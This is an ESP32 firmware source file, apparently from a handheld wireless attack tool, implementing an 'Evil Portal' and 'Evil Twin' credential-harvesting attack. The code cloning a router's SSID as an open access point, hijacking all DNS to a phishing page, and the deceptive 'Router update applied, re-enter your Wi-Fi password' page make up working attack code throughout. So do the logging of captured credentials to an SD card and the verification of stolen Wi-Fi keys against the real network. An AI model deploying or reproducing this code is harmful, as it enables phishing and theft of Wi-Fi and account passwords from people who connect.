#include "services/evil_portal.hpp"

#include <cstdio>
#include <cstring>
#include <string>

#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "esp_private/wifi.h"
#include "esp_wifi.h"
#include "esp_wifi_default.h"
#include "esp_wifi_netif.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "nvs_flash.h"

#include "core/diagnostics/log.hpp"
#include "services/radio/capture_store.hpp"
#include "services/storage/sd_logger.hpp"
#include "services/radio/radio_console.hpp"
#include "services/radio/radio_coordinator.hpp"
#include "services/radio/wifi_scanner.hpp"

namespace spectra5::platform {

namespace {
constexpr const char* kTag = "evil-portal";

// esp_wifi_remote (hosted) AP netif glue. The stock esp_netif_create_default_wifi_ap()
// double-adds the netif over the SDIO transport ("netif already added" abort); this
// mirrors M5Stack's working HAL pattern -- attach + wire the netstack on AP_START.
bool s_ap_netif_started = false;

void ap_start_handler(void* arg, esp_event_base_t base, int32_t event_id, void* data)
{
    auto* netif = static_cast<esp_netif_t*>(arg);
    if (s_ap_netif_started || esp_netif_is_netif_up(netif)) {
        return;
    }
    auto driver = static_cast<wifi_netif_driver_t>(esp_netif_get_io_driver(netif));
    uint8_t mac[6];
    if (esp_wifi_get_if_mac(driver, mac) != ESP_OK) {
        return;
    }
    if (esp_wifi_is_if_ready_when_started(driver)) {
        if (esp_wifi_register_if_rxcb(driver, esp_netif_receive, netif) != ESP_OK) {
            return;
        }
    }
    if (esp_wifi_internal_reg_netstack_buf_cb(esp_netif_netstack_buf_ref,
                                              esp_netif_netstack_buf_free) != ESP_OK) {
        return;
    }
    esp_netif_set_mac(netif, mac);
    esp_netif_action_start(netif, base, event_id, data);
    s_ap_netif_started = true;
}

void ap_stop_handler(void* arg, esp_event_base_t base, int32_t event_id, void* data)
{
    auto* netif = static_cast<esp_netif_t*>(arg);
    if (!s_ap_netif_started && !esp_netif_is_netif_up(netif)) {
        return;
    }
    esp_netif_action_stop(netif, base, event_id, data);
    s_ap_netif_started = false;
}

// Generic captive-portal page. Whatever the victim types is POSTed to /login.
const char* kPortalPage =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>WiFi Login</title><style>body{font-family:sans-serif;background:#111;color:#eee;"
    "display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
    ".c{background:#1c1c1c;padding:32px;border-radius:12px;width:300px}h2{margin:0 0 16px}"
    "input{width:100%;padding:12px;margin:8px 0;border:0;border-radius:8px;box-sizing:border-box}"
    "button{width:100%;padding:12px;margin-top:12px;border:0;border-radius:8px;background:#2d7;"
    "font-weight:bold}</style></head><body><div class=c><h2>Sign in to WiFi</h2>"
    "<form method=POST action=/login><input name=email placeholder='Email' type=email>"
    "<input name=password placeholder='Password' type=password>"
    "<button>Connect</button></form></div></body></html>";

// Evil Twin captive page: impersonates the cloned router and asks for ITS Wi-Fi
// password (%s = target SSID, embedded twice). Built per-request into g_page_buf.
const char* kTwinPageFmt =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>%s</title><style>body{font-family:sans-serif;background:#0b0b0b;color:#eee;"
    "display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
    ".c{background:#1c1c1c;padding:32px;border-radius:12px;width:320px}h2{margin:0 0 6px}"
    "p{color:#aaa;font-size:14px;margin:0 0 16px}"
    "input{width:100%%;padding:12px;margin:8px 0;border:0;border-radius:8px;box-sizing:border-box}"
    "button{width:100%%;padding:12px;margin-top:12px;border:0;border-radius:8px;background:#2d7;"
    "font-weight:bold}</style></head><body><div class=c>"
    "<h2>%s</h2><p>Router update applied. Re-enter your Wi-Fi password to reconnect.</p>"
    "<form method=POST action=/login><input name=wifi_password placeholder='Wi-Fi password' "
    "type=password autofocus><button>Reconnect</button></form></div></body></html>";

char g_portal_ssid[33]    = {0};
bool g_twin_mode          = false;
char g_page_buf[1024]     = {0};
char g_template_path[160] = {0};  // SD HTML template path, empty = built-in page
std::string g_template_html;      // inline embedded HTML, overrides path/built-in

// Password-verify STA-connect result signalling.
EventGroupHandle_t g_verify_events = nullptr;
constexpr int kVerifyOk            = (1 << 0);
constexpr int kVerifyFail          = (1 << 1);

void verify_evt_handler(void*, esp_event_base_t, int32_t id, void*)
{
    if (g_verify_events == nullptr) {
        return;
    }
    if (id == WIFI_EVENT_STA_CONNECTED) {
        xEventGroupSetBits(g_verify_events, kVerifyOk);  // associated + 4-way OK
    } else if (id == WIFI_EVENT_STA_DISCONNECTED) {
        xEventGroupSetBits(g_verify_events, kVerifyFail);  // wrong key / unreachable
    }
}
}  // namespace

void evil_portal_dns_task(void* arg);
void evil_portal_worker(void* arg);

EvilPortal& EvilPortal::instance()
{
    static EvilPortal portal;
    return portal;
}

bool EvilPortal::active() const
{
    return active_;
}

int EvilPortal::captured() const
{
    return captured_;
}

void EvilPortal::note_capture()
{
    ++captured_;
}

void EvilPortal::set_last_password(const std::string& pw)
{
    last_password_ = pw;
}

void EvilPortal::set_ap_channel(uint8_t ch)
{
    if (ch >= 1 && ch <= 13) {
        ap_channel_ = ch;
    }
}

void EvilPortal::set_template(const std::string& path)
{
    template_path_ = path;
}

void EvilPortal::set_template_html(const std::string& html)
{
    template_html_ = html;
}

std::string EvilPortal::last_password() const
{
    return last_password_;
}

int EvilPortal::verify_state() const
{
    return verify_state_;
}

void EvilPortal::verify_last()
{
    if (last_password_.empty() || pending_ssid_.empty()) {
        return;
    }
    verify_state_ = 1;  // verifying
    verify_req_   = true;
    ensure_worker();
}

// --- HTTP handlers -----------------------------------------------------------
static esp_err_t portal_get(httpd_req_t* req)
{
    httpd_resp_set_type(req, "text/html");
    // Inline embedded template (built-in picker) takes top priority.
    if (!g_template_html.empty()) {
        std::string html = g_template_html;
        std::size_t pos;
        while ((pos = html.find("{SSID}")) != std::string::npos) {
            html.replace(pos, 6, g_portal_ssid);
        }
        httpd_resp_sendstr(req, html.c_str());
        return ESP_OK;
    }
    // User-supplied SD template (with optional {SSID} placeholder) is next.
    if (g_template_path[0] != '\0') {
        FILE* f = std::fopen(g_template_path, "rb");
        if (f) {
            std::string html;
            char tmp[512];
            std::size_t n;
            while ((n = std::fread(tmp, 1, sizeof(tmp), f)) > 0) {
                html.append(tmp, n);
            }
            std::fclose(f);
            std::size_t pos;
            while ((pos = html.find("{SSID}")) != std::string::npos) {
                html.replace(pos, 6, g_portal_ssid);
            }
            if (!html.empty()) {
                httpd_resp_sendstr(req, html.c_str());
                return ESP_OK;
            }
        }
        // unreadable/empty -> fall through to the built-in page
    }
    if (g_twin_mode) {
        std::snprintf(g_page_buf, sizeof(g_page_buf), kTwinPageFmt, g_portal_ssid, g_portal_ssid);
        httpd_resp_sendstr(req, g_page_buf);
    } else {
        httpd_resp_sendstr(req, kPortalPage);
    }
    return ESP_OK;
}

static esp_err_t portal_post(httpd_req_t* req)
{
    char body[256] = {0};
    int total      = 0;
    while (total < (int)sizeof(body) - 1) {
        int r = httpd_req_recv(req, body + total, sizeof(body) - 1 - total);
        if (r <= 0) {
            break;
        }
        total += r;
    }
    body[total > 0 ? total : 0] = '\0';

    spectra5::log::tagWarn(kTag, "CAPTURED CREDS: {}", body);
    char line[300];
    std::snprintf(line, sizeof(line), "*** CREDS: %s", body);
    spectra5::services::RadioConsole::instance().log(line);
    spectra5::services::CaptureStore::instance().queue_line(std::string("CREDS ") + body);
    spectra5::services::SdLogger::instance().enqueue(
        "wifi/creds.txt", std::string("[") + g_portal_ssid + "] " + body);

    // Pull the password field out so the Evil Twin can verify it against the real AP.
    // Form is "wifi_password=..." (twin) or "...&password=..." (generic login).
    std::string b(body);
    std::size_t pos = b.find("password=");
    if (pos != std::string::npos) {
        std::string pw = b.substr(pos + 9);
        const std::size_t amp = pw.find('&');
        if (amp != std::string::npos) {
            pw = pw.substr(0, amp);
        }
        std::string decoded;  // minimal URL-decode (+ and %XX)
        for (std::size_t i = 0; i < pw.size(); ++i) {
            if (pw[i] == '+') {
                decoded += ' ';
            } else if (pw[i] == '%' && i + 2 < pw.size()) {
                auto hex = [](char c) {
                    return c <= '9' ? c - '0' : (c | 0x20) - 'a' + 10;
                };
                decoded += static_cast<char>(hex(pw[i + 1]) * 16 + hex(pw[i + 2]));
                i += 2;
            } else {
                decoded += pw[i];
            }
        }
        EvilPortal::instance().set_last_password(decoded);
    }
    EvilPortal::instance().note_capture();

    httpd_resp_set_type(req, "text/html");
    httpd_resp_sendstr(req, "<html><body style='font-family:sans-serif;background:#111;color:#eee'>"
                            "<h3>Connecting...</h3></body></html>");
    return ESP_OK;
}

// --- DNS hijack: answer every A query with the portal IP (192.168.4.1) --------
// Persistent DNS task: never deleted. Opens/binds its socket while the portal is
// active and answers every A query with 192.168.4.1; closes the socket when idle.
void evil_portal_dns_task(void* arg)
{
    auto* self = static_cast<EvilPortal*>(arg);
    int s      = -1;
    uint8_t buf[512];
    for (;;) {
        if (!self->active_) {
            if (s >= 0) {
                close(s);
                s = -1;
            }
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }
        if (s < 0) {
            s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (s < 0) {
                vTaskDelay(pdMS_TO_TICKS(200));
                continue;
            }
            struct timeval tv = {.tv_sec = 0, .tv_usec = 300000};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            struct sockaddr_in addr = {};
            addr.sin_family         = AF_INET;
            addr.sin_port           = htons(53);
            addr.sin_addr.s_addr    = htonl(INADDR_ANY);
            if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
                close(s);
                s = -1;
                vTaskDelay(pdMS_TO_TICKS(300));
                continue;
            }
        }
        struct sockaddr_in from;
        socklen_t flen = sizeof(from);
        int n          = recvfrom(s, buf, sizeof(buf), 0, (struct sockaddr*)&from, &flen);
        if (n < 12 || n + 16 > (int)sizeof(buf)) {
            continue;
        }
        buf[2] = 0x81;
        buf[3] = 0x80;
        buf[6] = 0x00;
        buf[7] = 0x01;  // ANCOUNT = 1
        uint8_t* p = buf + n;
        *p++       = 0xC0;
        *p++       = 0x0C;  // pointer to the question name
        *p++       = 0x00;
        *p++       = 0x01;  // type A
        *p++       = 0x00;
        *p++       = 0x01;  // class IN
        *p++       = 0x00;
        *p++       = 0x00;
        *p++       = 0x00;
        *p++       = 0x3C;  // TTL 60
        *p++       = 0x00;
        *p++       = 0x04;            // RDLENGTH 4
        *p++       = 192;
        *p++       = 168;
        *p++       = 4;
        *p++       = 1;  // 192.168.4.1
        sendto(s, buf, n + 16, 0, (struct sockaddr*)&from, flen);
    }
}

// start()/stop() are non-blocking: they record the desired state and wake the
// worker, which does the heavy esp_wifi/httpd/netif work on a large stack (doing
// it on the LVGL event thread overflowed its stack -> "Stack protection fault").
bool EvilPortal::start(const std::string& ssid)
{
    pending_ssid_ = ssid;
    desired_      = true;
    ensure_worker();
    return true;
}

void EvilPortal::stop()
{
    desired_ = false;
    ensure_worker();
}

void EvilPortal::ensure_worker()
{
    if (worker_ == nullptr) {
        xTaskCreate(&evil_portal_worker, "ep_worker", 12288, this, 5,
                    reinterpret_cast<TaskHandle_t*>(&worker_));
        // Persistent DNS task (created once, never deleted -- deleting a
        // socket-using task corrupted the TLS deletion callbacks). It only binds
        // and answers while the portal is active.
        xTaskCreate(&evil_portal_dns_task, "ep_dns", 8192, this, 5,
                    reinterpret_cast<TaskHandle_t*>(&dns_task_));
    } else {
        xTaskNotifyGive(static_cast<TaskHandle_t>(worker_));
    }
}

void evil_portal_worker(void* arg)
{
    auto* self = static_cast<EvilPortal*>(arg);
    for (;;) {
        ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(500));
        if (self->verify_req_) {
            self->verify_req_ = false;
            self->do_verify();
        }
        if (self->desired_ && !self->active_) {
            self->do_start();
        } else if (!self->desired_ && self->active_) {
            self->do_stop();
        }
    }
}

void EvilPortal::do_start()
{
    if (active_) {
        return;
    }
    // Take the radio: stop the STA scanner and route Wi-Fi.
    if (auto* sc = services::wifi_scanner()) {
        sc->stop();
        sc->release_radio();
    }
    if (auto* co = services::radio_coordinator()) {
        co->acquire_for_wifi();
    }

    esp_err_t nvs = nvs_flash_init();
    if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }
    esp_netif_init();
    esp_event_loop_create_default();
    // Hosted AP netif: build it the way M5Stack's HAL does (esp_netif_create_default_
    // wifi_ap() double-adds over the SDIO transport and aborts "netif already added").
    if (ap_netif_ == nullptr) {
        esp_netif_config_t ncfg = ESP_NETIF_DEFAULT_WIFI_AP();
        ap_netif_               = esp_netif_new(&ncfg);
        esp_netif_attach_wifi_ap(static_cast<esp_netif_t*>(ap_netif_));
        s_ap_netif_started = false;
        esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_AP_START, &ap_start_handler, ap_netif_);
        esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_AP_STOP, &ap_stop_handler, ap_netif_);
    }

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) != ESP_OK) {
        spectra5::log::tagError(kTag, "wifi_init failed");
        return;
    }
    wifi_config_t ap = {};
    const std::string name = pending_ssid_.empty() ? "Free WiFi" : pending_ssid_;
    // Twin mode (real SSID, not the generic hotspot): serve the "re-enter your Wi-Fi
    // password" page instead of the generic login, so we harvest THAT router's key.
    g_twin_mode = (name != "Free WiFi");
    std::strncpy(g_portal_ssid, name.c_str(), sizeof(g_portal_ssid) - 1);
    g_portal_ssid[sizeof(g_portal_ssid) - 1] = '\0';
    std::strncpy(g_template_path, template_path_.c_str(), sizeof(g_template_path) - 1);
    g_template_path[sizeof(g_template_path) - 1] = '\0';
    g_template_html                              = template_html_;
    std::strncpy((char*)ap.ap.ssid, name.c_str(), sizeof(ap.ap.ssid) - 1);
    ap.ap.ssid_len       = name.size();
    ap.ap.channel        = ap_channel_;  // match the real AP so a parallel deauth coexists
    ap.ap.max_connection = 4;
    ap.ap.authmode       = WIFI_AUTH_OPEN;
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap);
    if (esp_wifi_start() != ESP_OK) {
        spectra5::log::tagError(kTag, "wifi_start (AP) failed");
        return;
    }

    // Start the HTTP server ONCE and keep it for the app's lifetime. httpd_stop()
    // deletes its task, and deleting a task that holds a pthread TLS deletion
    // callback aborts here because that callback lives in PSRAM-XIP text which
    // esp_ptr_executable() rejects ("TLSP deletion callback overwritten"). The
    // server just listens; it's harmless while the AP is down.
    if (http_handle_ == nullptr) {
        httpd_config_t hc     = HTTPD_DEFAULT_CONFIG();
        hc.uri_match_fn       = httpd_uri_match_wildcard;
        hc.max_uri_handlers   = 4;
        httpd_handle_t server = nullptr;
        if (httpd_start(&server, &hc) != ESP_OK) {
            spectra5::log::tagError(kTag, "httpd_start failed");
            return;
        }
        http_handle_ = server;
        httpd_uri_t post = {
            .uri = "/login", .method = HTTP_POST, .handler = portal_post, .user_ctx = nullptr};
        httpd_register_uri_handler(server, &post);
        httpd_uri_t get = {
            .uri = "/*", .method = HTTP_GET, .handler = portal_get, .user_ctx = nullptr};
        httpd_register_uri_handler(server, &get);
    }

    captured_ = 0;
    active_   = true;  // the persistent DNS task picks this up and binds its socket

    const char* kind = g_twin_mode ? "EVIL TWIN" : "EVIL PORTAL";
    spectra5::services::RadioConsole::instance().log(std::string("> ") + kind + " up: \"" + name +
                                                     "\" (open AP, 192.168.4.1)");
    spectra5::log::tagInfo(kTag, "{} up: SSID=\"{}\"", kind, name);
}

void EvilPortal::do_stop()
{
    if (!active_) {
        return;
    }
    active_ = false;  // the DNS task closes its socket on its own
    vTaskDelay(pdMS_TO_TICKS(400));  // let it release the socket before netif teardown
    // NOTE: the HTTP server is intentionally left running (see do_start) -- stopping
    // it deletes a pthread-TLS task and aborts under PSRAM-XIP.
    esp_wifi_stop();
    esp_wifi_deinit();
    if (ap_netif_ != nullptr) {
        esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_AP_START, &ap_start_handler);
        esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_AP_STOP, &ap_stop_handler);
        esp_netif_destroy(static_cast<esp_netif_t*>(ap_netif_));
        ap_netif_      = nullptr;
        s_ap_netif_started = false;
    }
    if (auto* co = services::radio_coordinator()) {
        co->release_all();
    }
    // Hand the radio back to the STA scanner.
    if (auto* sc = services::wifi_scanner()) {
        sc->start();
    }
    spectra5::services::RadioConsole::instance().log("> EVIL PORTAL stopped");
    spectra5::log::tagInfo(kTag, "Evil Portal stopped");
}

// Evil Twin password verify: bring the AP down, then STA-connect to the real AP with
// the captured password. STA_CONNECTED => the 4-way handshake passed (password good);
// STA_DISCONNECTED/timeout => wrong key or unreachable. No netif needed (assoc only).
void EvilPortal::do_verify()
{
    if (active_) {
        do_stop();
    }
    if (auto* sc = services::wifi_scanner()) {
        sc->stop();
        sc->release_radio();
    }
    if (auto* co = services::radio_coordinator()) {
        co->acquire_for_wifi();
    }

    bool ok = false;
    esp_netif_init();
    esp_event_loop_create_default();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) == ESP_OK) {
        g_verify_events = xEventGroupCreate();
        esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &verify_evt_handler, nullptr);

        wifi_config_t sta = {};
        std::strncpy((char*)sta.sta.ssid, pending_ssid_.c_str(), sizeof(sta.sta.ssid) - 1);
        std::strncpy((char*)sta.sta.password, last_password_.c_str(), sizeof(sta.sta.password) - 1);
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_set_config(WIFI_IF_STA, &sta);
        esp_wifi_start();
        esp_wifi_connect();

        const EventBits_t bits = xEventGroupWaitBits(
            g_verify_events, kVerifyOk | kVerifyFail, pdTRUE, pdFALSE, pdMS_TO_TICKS(12000));
        ok = (bits & kVerifyOk) != 0;

        esp_wifi_disconnect();
        esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &verify_evt_handler);
        esp_wifi_stop();
        esp_wifi_deinit();
        vEventGroupDelete(g_verify_events);
        g_verify_events = nullptr;
    }

    verify_state_ = ok ? 2 : 3;
    spectra5::services::RadioConsole::instance().log(
        std::string("*** PASSWORD \"") + last_password_ + "\" for \"" + pending_ssid_ +
        (ok ? "\": VALID" : "\": INVALID"));
    spectra5::log::tagWarn(kTag, "verify \"{}\" -> {}", pending_ssid_, ok ? "VALID" : "INVALID");

    if (auto* co = services::radio_coordinator()) {
        co->release_all();
    }
    if (auto* sc = services::wifi_scanner()) {
        sc->start();
    }
}

}  // namespace spectra5::platform
